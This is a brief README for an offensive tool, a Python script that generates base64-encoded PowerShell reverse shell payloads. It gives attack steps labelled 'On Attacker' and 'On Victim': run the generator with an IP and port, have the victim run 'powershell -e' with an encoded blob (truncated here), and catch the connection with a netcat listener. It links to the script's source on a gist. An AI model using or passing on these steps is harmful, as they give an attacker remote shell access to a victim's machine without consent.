# Name
Powershell Reverse Shell Payload Generator (Base64 Encoded)

## Usage
```
# On Attacker
python3 mkpsrevshell.py <Rev IP> <Rev Port> 

# On Victim
powershell -e JABjAGwAaQBlAG4AdAAg...

# On Attacker
nc -lvp <Rev Port> 
```

## Source
https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py

